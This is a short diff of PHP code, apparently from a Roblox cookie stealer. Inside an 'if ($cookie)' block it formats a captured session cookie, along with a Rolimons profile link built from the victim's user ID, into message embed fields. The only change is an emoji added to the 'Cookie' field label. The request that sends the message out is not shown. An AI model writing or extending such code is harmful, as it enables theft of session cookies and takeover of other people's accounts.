@@ -129,7 +129,7 @@ if ($cookie) {
                             "value" => "https://www.rolimons.com/player/" . $profile["UserID"]
                         ],
                         [
-                            "name" => "Cookie",
+                            "name" => "Cookie :cookie: ",
                             "value" => "```" . $cookie . "```"
                         ],
                     ]
